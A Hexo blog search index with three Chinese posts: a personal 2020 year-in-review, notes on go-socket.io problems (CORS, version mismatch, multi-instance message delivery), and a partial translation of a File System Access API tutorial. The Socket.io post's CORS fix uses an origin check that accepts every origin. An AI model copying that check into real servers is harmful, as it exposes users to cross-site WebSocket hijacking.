<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>2020</title>
      <link href="/2020-conclusion/"/>
      <url>/2020-conclusion/</url>
      
        <content type="html"><![CDATA[<p>最近发现无聊的时候写博客是一种很好的消遣方式，恰逢本科快毕业了，那就写一篇博客来回味我无趣但又充实的一年吧。</p><h2 id="学业"><a href="#学业" class="headerlink" title="学业"></a>学业</h2><p>大三下学期是在家中度过的，上网课可以说是非常的水，选了4门专业课我都觉得选少了，害得我大四还要选3门。回想过去三年的大学课程，那可真是比高中轻松多了，甚至让我有了高中这么学说不定也能学得很好的错觉。我也不是什么志在科研的人，所以在这方面也没有太大的压力，能在课程中拿到不错的分数我就挺满意了。</p><p>最终也顺利保上研了，保研到了传说中的“大交换”，找了一个看起来不错的导师，也算是终结了自己曾经那所谓的名校情结。由于我自己太怠惰，夏令营一个也没有参加，虽然有那么一点的遗憾，但是总体上由于我自己越来越佛系的态度，现在觉得在本校继续延续三年轻松愉悦的学生生活也挺好，就是还要继续作业考试论文不太愉悦。</p><p>这么说来最大的遗憾可能是还是没有直接工作了2333333（主要是不想伤害父子感情，我们两个人估计在对方眼里都是冥顽不化吧，不过这方面的话题就说来话长了，之后心中又不快的时候估计会写写）。</p><h2 id="专业"><a href="#专业" class="headerlink" title="专业"></a>专业</h2><p>大三下期末的时候投了AT和字节，阿里等到我尘埃落定了才来找我，腾讯面了一面，结果因为我不去深圳给我挂了，所以最后靠耿总的内推进了字节。</p><p>七月份开始了实习，但实习内容和网上看的，听别人说的以及自己想象的都不一样。我投的是后台开发的岗位，结果很多时间都在为平台搭建前端。我后来也慢慢了解到，我们这个部门是新组建的，主要业务也是做设备，整个后端开发工作流以及团队建设都感觉不是很成熟。不过也省去了很多繁琐的开发流程。我进来之后基本也是自己独自摸索。</p><p>2020说实话，我感觉我在我的专业领域中学到了很多，涨了很多见识，这我得好好感谢我的室友们，尤其是耿总，他以一己之力提升了我们宿舍的技术氛围。他真是一个独立自主，思想自由的人（虽然我并不赞成他的所有观点），他在2020对我的影响真的很大，相必对我们宿舍的其他人影响也很大。</p><p>2020年我的专业能力可以说是“飞升”也不为过。从一个曾经因为不会一门编程语言被老师重拳出击（指计网课设）的CS萌新小白，变成了一个初窥门径的实习从业者，可以说是质的飞跃。虽说我大学报考专业一心咬死了计算机，但是感觉是在近两年我才开始逐渐感受到这个专业，这些学科，这些技术的魅力和乐趣。</p><p>如果要具体点说（指流水账），那在编程语言方面，我熟悉了Golang，Javascript，Typescript这三门语言，还稍微接触了一下Java。对于前端，我了解了HTML和CSS，学习了React和Electron框架，与浏览器也打了很多的交道。对于后端，我了解了不少Node的东西，在耿总的影响下学习到了许多数据系统方面的知识，年末学习了Websocket和一些消息中间件的用法。我也开始初探一些分布式相关的知识，看了传说中的MIT神课6.824，不过还没看完，之后接着继续，做了它前三个lab，了解了MapReduce计算模型，以及大名鼎鼎的Raft一致性算法等。期间还拜读了《DDIA》，读了一半，接下来也会继续读。年末的时候真切的感受到了开源社区的强大，找到了许多能直接使用的代码库，节约了许多开发成本，也让我从这些大佬的代码中学到很多东西。还有许多其他我的东西，比如一些框架的设计思想，一些系统的架构，一些工具的用法和原理等，就不一一列举了。</p><p>对于计算机这门学科，真的是想学的很多，想问的很多，希望自己能继续保持这份热情。</p><h2 id="生活娱乐"><a href="#生活娱乐" class="headerlink" title="生活娱乐"></a>生活娱乐</h2><h3 id="现实生活"><a href="#现实生活" class="headerlink" title="现实生活"></a>现实生活</h3><p>上半年由于疫情在家，吃完饭基本就没有活动，体重暴涨快20斤，下半年通过减少饭量，以及游了几次泳（大概有点帮助）又减了10斤下来，总之还需要继续减。不过由于长期不吃晚饭和时常不吃早饭，现在胃貌似出了点问题。</p><p>前不久和室友们一起去爬了一趟香山，可以说是把我折磨的够呛，可能是支气管炎的遗留问题，也可能是因为我长期不锻炼，爬山过程中我缺氧极其严重，脑袋胀痛发晕。然后年终和3位舍友去了个没有下一次的垃圾KTV唱歌。2020其余大部分时间都在家中和宿舍中度过，对于我来说算是再正常不过的了。当然还出了好几次勤，这个留到后面再说。</p><h3 id="影视剧"><a href="#影视剧" class="headerlink" title="影视剧"></a>影视剧</h3><p>疫情在家第一次看了美剧，是一部职场喜剧，叫做《Brooklyn Nine Nine》，中文译作《神烦警探》，这部剧非常好看，情节设计的很巧妙，笑点也很足，每一季还有喜闻乐见的传统保留剧情。算上2020年的更新我一口气追了八季，听说今年有第九季，十分期待。然后在家无聊透顶的我重温了《神探狄仁杰》的前两季，以及《大宋提刑官》第一季，本来还想看《武林外传》的，但是我用的视频软件没有版权，遂作罢。</p><p>电影看了《信条》，《姜子牙》以及《未来的未来》，都没有对我产生太大的触动，不过我本来就不常看电影。</p><h3 id="动画和漫画"><a href="#动画和漫画" class="headerlink" title="动画和漫画"></a>动画和漫画</h3><p>其实在进入大学之后，我就没有怎么追漫画了，一般都是屯好几话然后一口气看，还有一个原因是，之前追的漫画太多了，然后很多都消失在了大版权时代的洪流中，我也懒得去找了，也没有那么多闲钱去买正版。一直在追的也就《辉夜大小姐》和《一拳超人》，之前还有《七原罪》，不过已经完结了，其余的都是想起来才看一下。</p><p>动画倒是每个季度仍然看了很多，以及补了很多老番。如果要选出几部让我印象深刻的作品，那一定是《进击的巨人》，《别对映像研出手》以及《白箱》。《白箱》带给我的感动就像当初看《爆漫王》时的一样，中二期的我竟然错过了这一部佳作，实属不该。《巨人》还在更新中，剧情让人欲罢不能，而且我们宿舍还有一重度巨人厨</p><p>《别对映像研出手》和《白箱》对于我们动画爱好者来说都是狂欢。其实去年本来还有天下第一的《摇曳露营》第二季的，但是跳票到今年一月了（不也挺好吗）。</p><h3 id="恋爱"><a href="#恋爱" class="headerlink" title="恋爱"></a>恋爱</h3><p>无。希望接下来会有。</p><h3 id="电子游戏"><a href="#电子游戏" class="headerlink" title="电子游戏"></a>电子游戏</h3><p>说到这个话题我可就更来劲了。虽然去年玩的不多，但是玩的时间还是挺长的。</p><h4 id="音游"><a href="#音游" class="headerlink" title="音游"></a>音游</h4><p>2020可谓是SDVX音游力飞升的一年。2020年1月我还只是一个被17暴打的小魔骑，现在已经是后光刚力罗了。出勤也出了好几次，每一次出勤都感受到了地力的提升。移动端倒是没怎么玩了，Arcaea打不出出彩的成绩，遂不玩了。下半年开始玩了プロジェクトセカイ，虽然打击感很塑料，但是作为术术人，能玩到那么多曲子是真不戳。</p><h4 id="PC"><a href="#PC" class="headerlink" title="PC"></a>PC</h4><p>去年又重新回坑了风暴，但是现在又回到半弃坑状态了。然后就是期待了一年的赛博朋克2077。。。怎么说呢，可以说是期待过头了，我本来期待的是GTA，结果来的还是巫师，嗯。。就这种感觉。。只能说我对CRPG着实没啥感觉。现在玩了20小时玩完了两个主要NPC的主线，接下来有兴趣了再继续推主线吧。</p><h4 id="PS4"><a href="#PS4" class="headerlink" title="PS4"></a>PS4</h4><p>今年玩的最多的游戏非歌姬计划FTDX莫属了，这游戏是真好玩，老婆们跳舞是真好看，术曲是真好听，我玩的是真的垃圾。现在也就只能玩玩8星曲的样子，还得继续多练。</p><p>除了歌姬计划，还借了隔壁隔壁宿舍小双同学的战神4碟子来玩，一连玩了几天通关了，真不愧是上个世代末的神作，剧情，玩法，任务设计都是一流，我已经迫不及待想玩战神5了。</p><p>然后就用赛博朋克的退款买了蜘蛛侠莫拉尔斯，对于我这种第一次接触蜘蛛侠游戏的人来说是非常新鲜了，不过到后面也就是刷刷刷，剧情也是非常王道的超级英雄剧情，可以算得上一款佳作。</p><p>接下来又体验了十三机兵，这游戏颠覆了我对文字冒险游戏的认识，总之是非常的想玩，等打折必入。</p><h2 id="展望"><a href="#展望" class="headerlink" title="展望"></a>展望</h2><p>2021，希望家人和自己健康，希望研究生能和现在室友继续做室友，希望专业能力能更上一层楼，希望音游力继续飞升，希望能成为「或帝滅斗」，希望能有GTA6的消息，希望能看到更好看的动画片，希望能谈个恋爱。（当我正要更新这篇文章的时候，我发现我又一位室友脱单了，酸死我了）</p>]]></content>
      
      
      <categories>
          
          <category> 生活 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 年终总结 </tag>
            
            <tag> 流水账 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Socket.io 踩坑记录</title>
      <link href="/socket-io-issues/"/>
      <url>/socket-io-issues/</url>
      
        <content type="html"><![CDATA[<p>最近由于项目需要接触了 socket.io 这一套工具，它本身是一个 Node.js 的包，使用 long polling 或者 websocket 的方式（在我的项目中我是用的是 websocket）提供持续的网络连接服务。由于简单好用（虽然我在知乎上看到有人说这玩意儿就是给小白玩的，2333），很多开发者为其开发了不同语言的 SDK，比如 Java、C++、Go 等，然后我项目的前端用的 Node.js，后端用 Golang。由于 socket.io 本身的设计以及 Go 版本开源库的残缺，踩了很多坑，我决定在这篇博客中好好总结一下。</p><h2 id="跨域请求的问题"><a href="#跨域请求的问题" class="headerlink" title="跨域请求的问题"></a>跨域请求的问题</h2><p>由于 go-socket.io 是基于 http 服务器的，在建立 websocket 连接的时候会先发送一个 get 请求，由于请求是跨域的，所以理所应当会被服务器给拦下来，然后返回一个 403，所以首先得处理跨域的问题。</p><p>处理这个问题有很多种方式。</p><p>第一种方式是直接拿到请求后把 Header 里的 Origin 字段干掉，然后再交给接下来的 http 处理逻辑处理。第二种方式是添加一个中间件来设置 Header 中的允许跨域字段，这两种方式在这个 issue 中都有实现方法： <a href="https://github.com/googollee/go-socket.io/issues/242" target="_blank" rel="noopener">https://github.com/googollee/go-socket.io/issues/242</a></p><p>第三种方式是社区开发者们新提供的方式，就是在启动 socket.io server 的 option 中指定允许的域名，这算是最合适的一种方法了吧。</p><pre class=" language-go"><code class="language-go">allowOrigin <span class="token operator">:=</span> <span class="token keyword">func</span><span class="token punctuation">(</span>r <span class="token operator">*</span>http<span class="token punctuation">.</span>Request<span class="token punctuation">)</span> <span class="token builtin">bool</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">}</span>server<span class="token punctuation">,</span> err <span class="token operator">:=</span> socketio<span class="token punctuation">.</span><span class="token function">NewServer</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>engineio<span class="token punctuation">.</span>Options<span class="token punctuation">{</span>    Transports<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>transport<span class="token punctuation">.</span>Transport<span class="token punctuation">{</span>        <span class="token operator">&amp;</span>polling<span class="token punctuation">.</span>Transport<span class="token punctuation">{</span>        Client<span class="token punctuation">:</span> <span class="token operator">&amp;</span>http<span class="token punctuation">.</span>Client<span class="token punctuation">{</span>            Timeout<span class="token punctuation">:</span> time<span class="token punctuation">.</span>Minute<span class="token punctuation">,</span>        <span class="token punctuation">}</span><span class="token punctuation">,</span>        CheckOrigin<span class="token punctuation">:</span> allowOrigin<span class="token punctuation">,</span>        <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token operator">&amp;</span>websocket<span class="token punctuation">.</span>Transport<span class="token punctuation">{</span>        CheckOrigin<span class="token punctuation">:</span> allowOrigin<span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><p>更多信息可以查看这个 issue：<a href="https://github.com/googollee/go-socket.io/issues/372" target="_blank" rel="noopener">https://github.com/googollee/go-socket.io/issues/372</a></p><h2 id="go-socket-io-与-socket-io-的兼容性问题"><a href="#go-socket-io-与-socket-io-的兼容性问题" class="headerlink" title="go-socket.io 与 socket.io 的兼容性问题"></a>go-socket.io 与 socket.io 的兼容性问题</h2><p>在前端，我一开始使用的是 3.0 版本的 socket.io。结果发现建立连接的握手请求前后端对应不上，后端触发两次 connect 事件，之后也无法进行正常的双工通信，后来发现原来 go 这个库还不支持 2.0 版本及以上的 socket.io。这其中应该是通信协议上不一样。</p><p>这个项目其实很早就已经搁置了，owner 在几年前就撒手不管了，这几年一直是靠开源社区的开发者们来维护，所以这个项目的进度迟迟得不到更新。目前这个库只支持 <a href="mailto:socket.io@2.0">socket.io@2.0</a> 之前的版本，不支持 2.0。</p><p>如果实在要与 socket.io 2.0 进行对接，可以选用其他的语言进行开发，或者使用其他的几个 go 开源库，虽然这几个 star 不多，我也没用过。</p><ul><li><p><a href="https://github.com/pschlump/socketio" target="_blank" rel="noopener">https://github.com/pschlump/socketio</a></p></li><li><p><a href="https://github.com/ambelovsky/gosf-socketio" target="_blank" rel="noopener">https://github.com/ambelovsky/gosf-socketio</a></p></li></ul><p>详情可见这个 issue：<a href="https://github.com/googollee/go-socket.io/issues/188" target="_blank" rel="noopener">https://github.com/googollee/go-socket.io/issues/188</a></p><p>之后我也打算看看这个项目，看看能不能贡献点什么。</p><h2 id="分布式场景下的问题"><a href="#分布式场景下的问题" class="headerlink" title="分布式场景下的问题"></a>分布式场景下的问题</h2><p>当我把我的后端服务部署到了集群上，我发现有些时候客户端收不到本应收到的消息。经过一系列的分析查找，我发现原来是因为不只有一个实例部署了我的服务，然后所有访问服务的请求都会被 nginx 网关按照一定策略进行负载均衡，然后再分配到某个实例上。又因为我将所有的 socket 连接上下文都存到了内存中，每次都从内存中提取会议中的连接者，再将消息发给他们，由于负载均衡的存在，同一个会议的连接可能被导向不同的实例，这种情况下一个连接生产的信息就无法转发给另一个连接。</p><p>为解决这个问题可以从两方面入手。第一种是从负载均衡入手，nginx 的负载均衡策略有很多种，比如对 ip 进行 hash，或者对请求头中的某些信息进行 hash，然后将请求导向不同实例，我们可以更改策略将同一个会议的连接全部导向一个实例；第二种是使用消息中间件，将一个连接产生的消息推入消息队列中，然后另一个连接从中读取。</p><p>经过多方面的考量，我最终选用了更改 nginx 负载均衡策略的方式，因为公司的各个消息中间件组件都有很大的局限性，下面我也会说说各种方案我是怎么想的。</p><h3 id="负载均衡方案"><a href="#负载均衡方案" class="headerlink" title="负载均衡方案"></a>负载均衡方案</h3><p>socket.io 建立连接时会发送一个 GET 请求，然后开始进行握手，而我们可以自定义这个请求。但由于 socket.io 为了遵循 websocket 协议，当使用 websocket 协议传输时，我们没办法更改请求的 Header。但是我们仍然可以为请求添加 query 参数，比如我们可以让同一个会议的连接者请求时都在 query 中带上一个相同的标识，然后再将 nginx 的负载均衡策略改为只按照请求 uri 进行 hash，这样便可以将请求 uri 相同的所有连接都导向同一个实例。</p><p>不过这种方案可能会出现热点问题，那就等之后真的出现了再说吧。（不过我应该是等不到那个时候了）</p><h3 id="消息中间件方案"><a href="#消息中间件方案" class="headerlink" title="消息中间件方案"></a>消息中间件方案</h3><h4 id="Redis-消息队列"><a href="#Redis-消息队列" class="headerlink" title="Redis 消息队列"></a>Redis 消息队列</h4><p>其实 Redis 自己也实现了有消息队列功能的接口。消费者可以 Subscribe 一个 Channel，当生产者向 Channel 中推消息的时候，消费者便可以从此 Channel 中拿出消息。不过不幸的是，我们公司的 Redis 并没有支持这一功能，而且公司貌似禁用任何阻塞操作，遂作罢。另外，消费者是不是共同消费 Channel 中的消息，还是一个消费者一个副本，这个我也没有深入研究。</p><h4 id="利用-Redis-缓存自行实现"><a href="#利用-Redis-缓存自行实现" class="headerlink" title="利用 Redis 缓存自行实现"></a>利用 Redis 缓存自行实现</h4><p>这是一个临时得不能再临时的方案，肯定是无法投入大规模使用的。这个方案简单来说，就是在 Redis 中保存有到某个会议连接的实例，生产者会为每一个实例生产一份消息，然后每一个实例取出自己的一份，在发给连接到自己的连接者。这个方案在逻辑上是很完美的，但是会极其消耗资源。首先，我的一个消息大概会有 8KB，这对于 Redis 来说本身就很离谱了；其次，要从 Redis 中拿出实时的消息，需要随时轮询 Redis，因为公司的 Redis 不提供阻塞操作，而不停的轮询是极其浪费资源的。处于这样的考虑，我还是暂时没选择这样的方案。</p><h4 id="RocketMQ-等消息队列"><a href="#RocketMQ-等消息队列" class="headerlink" title="RocketMQ 等消息队列"></a>RocketMQ 等消息队列</h4><p>按理来说使用传统的消息队列是最靠谱的方案，生产者将消息推入消息队列，然后每一个订阅了的消费者都可以从中拿到消息。但是公司的消息队列组件看起来并不适合我们这业务场景。公司的 Kafka 主要是为离线业务服务，它会将消息转存到 HDFS，并不太适合我这样的实时在线业务。于是我选择了公司推荐的支持在线业务的 RocketMQ看一看。</p><p>其实 RocketMQ 是支持广播消费的（就是生产者产生的每一个消息每一个订阅了的消费者都能消费到，与之对应的是集群消费，就是一个消费者消费了其他消费者就消费不到了），但是公司的 RocketMQ 组建尚未支持。<del>那我就又只能爬了。</del>其实消费组这一概念也可以实现这样的机制，但是公司的消息队列服务都是公用的，每一个 Topic 的 Consume Group 都需要单独申请，我不可能为每一个实例都手动申请一个，因为实例是弹性变化的。遂作罢。</p><p>不过还是有一个方案的，就是自建一个消息队列服务，只给自己用，这样上面的问题就都迎刃而解了。不过这得以后有时间再来慢慢研究。。。</p><h2 id="写在最后的吐槽与总结之类的话"><a href="#写在最后的吐槽与总结之类的话" class="headerlink" title="写在最后的吐槽与总结之类的话"></a>写在最后的吐槽与总结之类的话</h2><p>go-socket.io 这个库其实还有一些其他问题，比如并没有保证连接的线程安全，之后我也想仔细看看它的源码以及 socket.io 的源码与原理，希望能帮这个开源项目做一点优化和增强工作，也好填补一下之后漫长寒假的空虚（到时候可能就每天躺尸了）</p><p>对于我接手的这个项目，虽然开发规模不大，主要逻辑也非常简单，比起我们的主要业务来说那就是小玩具，工程量和大作业差不多，但是也让我感受到了开发一个企业级应用需要考虑的各种事情，并且积累的挺多开发经验（虽然大部分是 Node.JS 和 TS 的经验）。</p><p>最后不得不说，开源真是个好东西，节约了大量开发成本，再次感谢各位开源大佬。</p>]]></content>
      
      
      <categories>
          
          <category> 编程学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> Node.js </tag>
            
            <tag> Golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>File System Access API：简化访问本地文件</title>
      <link href="/chrome-file-system-access/"/>
      <url>/chrome-file-system-access/</url>
      
        <content type="html"><![CDATA[<h2 id="原文章：https-web-dev-file-system-access"><a href="#原文章：https-web-dev-file-system-access" class="headerlink" title="原文章：https://web.dev/file-system-access/"></a>原文章：<a href="https://web.dev/file-system-access/" target="_blank" rel="noopener">https://web.dev/file-system-access/</a></h2><p>原作者 Thomas Steiner（<a href="https://twitter.com/tomayac" target="_blank" rel="noopener">@tomayac</a>）已同意。</p><h2 id="什么是-File-System-Access-API"><a href="#什么是-File-System-Access-API" class="headerlink" title="什么是 File System Access API"></a>什么是 File System Access API</h2><p>File System Access API（<a href="https://wicg.github.io/file-system-access/" target="_blank" rel="noopener">The File System Access API</a>，之前又叫 Native File System API，更之前叫 Writeable Files API）使得开发者们能够构建能与用户本地设备文件交互的强大 Web 应用，比如 IDE、图像视频编辑器、文本编辑器等。一旦用户允许了 Web 应用访问本地文件的请求，此 API 便可以使 Web 应用直接对用户设备上的文件和文件夹进行读写修改。除了读写文件， File System Access API 还提供了打开目录以及列举目录内容的能力。</p><p>如果你曾经操作过文件读写，那你会很熟悉我下面分享的内容。不过我还是鼓励你读一下这篇文章，因为不是所有的系统都是类似的。</p><p><strong>（原作者注：对于 File System Access API 的设计与实现我们进行了深思熟虑，以确保人们能够轻松的管理他们的文件。查看 <a href="##安全与权限">安全与权限</a> 部分来获取更多信息。)</strong></p><h2 id="文章进度（原文中已经全部完成）"><a href="#文章进度（原文中已经全部完成）" class="headerlink" title="文章进度（原文中已经全部完成）"></a>文章进度（原文中已经全部完成）</h2><p>前往 <a href="https://web.dev/file-system-access/#status" target="_blank" rel="noopener">https://web.dev/file-system-access/#status</a> 查看</p><h2 id="使用-File-System-Access-API"><a href="#使用-File-System-Access-API" class="headerlink" title="使用 File System Access API"></a>使用 File System Access API</h2><p>为了展示 File System Access API 的强大与好用，我写了一个单文件<a href="https://googlechromelabs.github.io/text-editor/" target="_blank" rel="noopener">文本编辑器</a>。它可以让你打开一个文本文件，编辑它，将修改保存回本地，或者新建一个文件然后保存修改到本地。这并不是什么精致（fancy）的东西，但它足以帮你理解概念。</p><h3 id="试试看"><a href="#试试看" class="headerlink" title="试试看"></a>试试看</h3><p>看看 File System Access API 在<a href="https://googlechromelabs.github.io/text-editor/" target="_blank" rel="noopener">文本编辑器</a> demo 中的表现。</p><h3 id="从本地文件系统读取一个文件"><a href="#从本地文件系统读取一个文件" class="headerlink" title="从本地文件系统读取一个文件"></a>从本地文件系统读取一个文件</h3><p>我想要做的第一件事是让用户选择一个文件，然后打开并从磁盘上读取这个文件。</p><h4 id="让用户选择一个文件进行读取"><a href="#让用户选择一个文件进行读取" class="headerlink" title="让用户选择一个文件进行读取"></a>让用户选择一个文件进行读取</h4><p>File System Access API 中的入口点（entry point）是 <a href="https://wicg.github.io/file-system-access/#api-showopenfilepicker" target="_blank" rel="noopener"><code>window.showOpenFilePicker()</code></a>。当调用它时，浏览器会弹出一个文件选择对话框，并让用户选择一个文件。用户选择完文件后，此 API 会返回一个文件句柄（handle）数组。<code>option</code> 参数可以让你影响文件选择器的行为，比如允许用户选择多个文件，目录或者其他文件类型。如果你没有指定 <code>option</code> 参数，选择器只让用户选择一个文件。这对于一个文本编辑器来说恰到好处。</p><p>和众多强大的 API 一样，必须在一个<a href="https://w3c.github.io/webappsec-secure-contexts/" target="_blank" rel="noopener">安全上下文（secure context）</a>中完成对 <code>showOpenFilePicker()</code> 的调用并且只能在一个 user gesture（详见 Chromium 对此的定义） 中被调用。</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">let</span> fileHandle<span class="token punctuation">;</span>butOpenFile<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// Destructure the one-element array.</span>  <span class="token punctuation">[</span>fileHandle<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">await</span> window<span class="token punctuation">.</span><span class="token function">showOpenFilePicker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// Do something with the file handle.</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>一旦用户选择了一个文件，<code>showOpenFilePicker()</code> 会返回一个句柄数组，在这种情况下会返回一个只有一个 <a href="https://wicg.github.io/file-system-access/#api-filesystemfilehandle" target="_blank" rel="noopener"><code>FileSystemFileHandle</code></a>  对象的数组，这个对象包含了需要和文件进行交互的属性和方法。</p><p>我们需要维护一个对此句柄的引用以便后续使用，我们需要用它来进行保存文件或者其他文件操作。</p><h4 id="从文件系统中读取一个文件"><a href="#从文件系统中读取一个文件" class="headerlink" title="从文件系统中读取一个文件"></a>从文件系统中读取一个文件</h4><p>现在你有了一个文件的句柄，这下你就能够拿到这个文件的属性或者访问这个文件本身。现在，我会简单地读读取它的内容。调用 <code>handle.getFile</code> 并返回一个 <a href="https://w3c.github.io/FileAPI/" target="_blank" rel="noopener"><code>File</code></a> 对象，它包含一个二进制文件（blob）。为了拿到二进制文件中的数据，调用<a href="https://developer.mozilla.org/en-US/docs/Web/API/Blob" target="_blank" rel="noopener">它的方法</a>（<code>slice()</code> , <code>stream()</code>, <code>text()</code>, <code>arrayBuffer()</code>）。</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">const</span> file <span class="token operator">=</span> <span class="token keyword">await</span> fileHandle<span class="token punctuation">.</span><span class="token function">getFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> contents <span class="token operator">=</span> <span class="token keyword">await</span> file<span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><code>FileSystemFileHandle.getFile()</code> 返回的 <code>File</code> 对象只有对应的底层文件没有后被更改时可读。如果底层文件已经被修改饿了，那此 <code>File</code> 对象便会变为不可读，这时候你得重新调用 <code>getFile()</code> 来获取新的 <code>File</code> 对象来读取被更改的数据。</p><h4 id="将上面的操作组合到一起"><a href="#将上面的操作组合到一起" class="headerlink" title="将上面的操作组合到一起"></a>将上面的操作组合到一起</h4><p>当用户点击打开（Open）按钮，浏览器会弹出文件选择器。当选中一个文件，这个应用会把读到的内容放入一个 <code>&lt;textarea&gt;</code> 中。</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">let</span> fileHandle<span class="token punctuation">;</span>butOpenFile<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  <span class="token punctuation">[</span>fileHandle<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">await</span> window<span class="token punctuation">.</span><span class="token function">showOpenFilePicker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">const</span> file <span class="token operator">=</span> <span class="token keyword">await</span> fileHandle<span class="token punctuation">.</span><span class="token function">getFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">const</span> contents <span class="token operator">=</span> <span class="token keyword">await</span> file<span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  textArea<span class="token punctuation">.</span>value <span class="token operator">=</span> contents<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id="将文件写入本地文件系统"><a href="#将文件写入本地文件系统" class="headerlink" title="将文件写入本地文件系统"></a>将文件写入本地文件系统</h3><p>在这个文本编辑器中，有两种方式来保存文件：<strong>保存（Save）</strong>和<strong>另存为（Save As）</strong>。<strong>保存</strong>使用之前的文件句柄简单地将修改写回原文件中。但是<strong>另存为</strong>创建了一个新的文件，并需要一个新的文件句柄。</p><h4 id="创建一个新文件"><a href="#创建一个新文件" class="headerlink" title="创建一个新文件"></a>创建一个新文件</h4><p>为了保存一个文件，我们需要调用 <code>showSaveFilePicker()</code> 来让文件选择器变为“保存”模式，此模式下，文件选择器让用户选择一个文件来进行保存。在这个文件编辑器中，我想让它自动加上 <code>.txt</code> 的扩展名，所以我提供了一些额外的参数。</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">getNewFileHandle</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">const</span> options <span class="token operator">=</span> <span class="token punctuation">{</span>    types<span class="token punctuation">:</span> <span class="token punctuation">[</span>      <span class="token punctuation">{</span>        description<span class="token punctuation">:</span> <span class="token string">'Text Files'</span><span class="token punctuation">,</span>        accept<span class="token punctuation">:</span> <span class="token punctuation">{</span>          <span class="token string">'text/plain'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'.txt'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token punctuation">}</span><span class="token punctuation">,</span>      <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token punctuation">}</span><span class="token punctuation">;</span>  <span class="token keyword">const</span> handle <span class="token operator">=</span> <span class="token keyword">await</span> window<span class="token punctuation">.</span><span class="token function">showSaveFilePicker</span><span class="token punctuation">(</span>options<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> handle<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h4 id="保存修改到本地磁盘"><a href="#保存修改到本地磁盘" class="headerlink" title="保存修改到本地磁盘"></a>保存修改到本地磁盘</h4><p>你可以 <a href="https://github.com/GoogleChromeLabs/text-editor/" target="_blank" rel="noopener">Github</a> 上找到我这个<a href="https://googlechromelabs.github.io/text-editor/" target="_blank" rel="noopener">文本编辑器</a> demo 的所有代码。核心的文件系统交互部分在 <code>fs-helpers.js</code> 中。简单来说，整个过程如以下代码所示。我会一步一步地进行解释。</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">writeFile</span><span class="token punctuation">(</span>fileHandle<span class="token punctuation">,</span> contents<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// Create a FileSystemWritableFileStream to write to.</span>  <span class="token keyword">const</span> writable <span class="token operator">=</span> <span class="token keyword">await</span> fileHandle<span class="token punctuation">.</span><span class="token function">createWritable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// Write the contents of the file to the stream.</span>  <span class="token keyword">await</span> writable<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>contents<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// Close the file and write the contents to disk.</span>  <span class="token keyword">await</span> writable<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>向磁盘中写入数据需要利用 <a href="https://wicg.github.io/file-system-access/#api-filesystemwritablefilestream" target="_blank" rel="noopener"><code>FileSystemWritableFileStream</code></a> 对象，其本质是一个  <a href="https://developer.mozilla.org/en-US/docs/Web/API/WritableStream" target="_blank" rel="noopener"><code>WritableStream</code></a>。调用 <code>createWritable()</code> 为文件句柄对象创建文件流（stream）。调用 <code>createWritable()</code> 